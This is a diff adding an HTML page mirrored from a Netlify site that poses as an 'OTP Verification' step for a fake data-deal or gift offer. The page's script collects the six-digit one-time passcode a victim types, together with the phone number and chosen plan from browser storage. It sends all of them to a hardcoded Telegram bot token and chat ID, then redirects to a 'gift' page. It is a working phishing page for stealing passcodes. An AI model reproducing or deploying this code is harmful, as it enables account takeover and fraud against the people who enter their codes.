@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from star-lin-k-eco-net-data-dea-ls.netlify.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 03 Jan 2026 08:32:25 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: "Inter", Arial, sans-serif;
+        background: url('assets/img/background-image.jpg') no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #ccc;
+    }
+
+    .container {
+        width: 380px;
+        max-width: 92%;
+        padding: 30px 25px;
+        background: white;
+        border-radius: 16px;
+        backdrop-filter: blur(14px);
+        box-shadow: 0 8px 28px rgba(0,0,0,0.35);
+        text-align: center;
+    }
+
+    h2 {
+        margin-bottom: 5px;
+        font-size: 26px;
+        
+        color: #181515;
+        font-weight: 600;
+    }
+
+    h3 {
+        margin-top: -3px;
+
+
+        color: #181515;
+        
+        font-size: 18px;
+    }
+
+    p {
+        color: #181515;
+        font-size: 15px;
+    }
+
+    .otp-boxes {
+        display: flex;
+        justify-content: center;
+        margin: 25px 0;
+        gap: 10px;
+    }
+
+    .otp-input {
+        width: 48px;
+        height: 55px;
+        font-size: 22px;
+        text-align: center;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        outline: none;
+        background: rgba(255,255,255,0.95);
+        color: #333;
+        font-weight: bold;
+        transition: 0.2s;
+    }
+
+    .otp-input:focus {
+        border-color: #0d6efd;
+        box-shadow: 0 0 6px rgba(0,112,255,0.6);
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        font-size: 18px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+        transition: 0.25s ease;
+    }
+
+    #submitBtn {
+        background: #0d6efd;
+        color: #fff;
+    }
+
+    #submitBtn:hover {
+        background: #0b5ed7;
+    }
+
+    .resend-btn {
+        margin-top: 10px;
+        background: #ddd;
+        cursor: not-allowed;
+    }
+
+    .active-resend {
+        background: #ffeb3b;
+        cursor: pointer;
+        color: #000;
+    }
+
+    .timer {
+        margin-top: 10px;
+        font-size: 15px;
+        opacity: 0.9;
+        
+        
+        color: #181515;
+    }
+
+    /* ===== MOBILE RESPONSIVE ===== */
+    @media (max-width: 420px) {
+        .otp-input {
+            width: 38px;
+            height: 50px;
+            font-size: 20px;
+        }
+        h2 { font-size: 22px; }
+        h3 { font-size: 16px; }
+        p  { font-size: 14px; }
+    }
+
+    @media (max-width: 350px) {
+        .otp-input {
+            width: 32px;
+            height: 45px;
+            font-size: 18px;
+        }
+        .otp-boxes {
+            gap: 6px;
+        }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2>OTP Verification</h2>
+    <p>Enter the OTP sent to your number</p>
+    <h3 id="phoneNumber"></h3>
+
+    <div class="otp-boxes">
+         <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+    </div>
+
+    <button id="submitBtn">Submit</button>
+
+    <div class="timer">Resend OTP in <span id="countdown">110</span> seconds</div>
+    <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+</div>
+
+<script>
+const inputs = document.querySelectorAll(".otp-input");
+const submitBtn = document.getElementById("submitBtn");
+const resendBtn = document.getElementById("resendBtn");
+const countdownEl = document.getElementById("countdown");
+
+// Load phone number
+window.addEventListener("load", () => {
+    const savedPhone = localStorage.getItem("username");
+    document.getElementById("phoneNumber").textContent = savedPhone ? savedPhone : "Unknown Number";
+});
+
+// Auto movement
+inputs.forEach((input, i) => {
+    input.addEventListener("input", () => {
+        if (input.value.length === 1 && i < inputs.length - 1) {
+            inputs[i + 1].focus();
+        }
+    });
+    input.addEventListener("keydown", e => {
+        if (e.key === "Backspace" && input.value === "" && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+// Timer
+let timeLeft = 110;
+const timer = setInterval(() => {
+    timeLeft--;
+    countdownEl.textContent = timeLeft;
+
+    if (timeLeft <= 0) {
+        clearInterval(timer);
+        resendBtn.disabled = false;
+        resendBtn.classList.add("active-resend");
+        resendBtn.textContent = "Resend OTP";
+        document.querySelector(".timer").textContent = "You can now resend OTP";
+    }
+}, 1000);
+
+// Submit OTP
+// Submit OTP
+submitBtn.addEventListener("click", async () => {
+  const otp = Array.from(inputs).map(i => i.value).join("");
+  const savedPhone = localStorage.getItem("username");
+
+  if (!savedPhone) {
+    alert("Phone number missing. Please restart verification.");
+    return;
+  }
+
+  if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+    alert("Please enter a valid 6-digit OTP");
+    return;
+  }
+
+  // Retrieve selected plan from sessionStorage
+  const selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan') || '{}');
+  const planName = selectedPlan.name || selectedPlan.shortName || 'Unknown';
+
+  // Prepare message for Telegram (now includes plan)
+  const message = `Star OTP Submission:\nPhone: ${savedPhone}\nOTP: ${otp}\nPlan: ${planName}`;
+
+  try {
+    const botToken = "7727536198:AAHVg5-c49YD5HLPHN38BR0fXMNSu5kc8F8";      // Replace with your bot token
+    const chatId = "6616863663";          // Replace with your Telegram chat ID
+
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+    const data = await response.json();
+
+    if (!data.ok) {
+      throw new Error(data.description || "Failed to send OTP to Telegram");
+    }
+
+    // ✅ OTP sent successfully, redirect to next page
+    window.location.href = "gift.html";  // Replace with your target page
+
+  } catch (error) {
+    console.error("Telegram Error:", error);
+    alert(error.message);
+  }
+});
+
+</script>
+
+</body>
+
+<!-- Mirrored from star-lin-k-eco-net-data-dea-ls.netlify.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 03 Jan 2026 08:32:26 GMT -->
+</html>
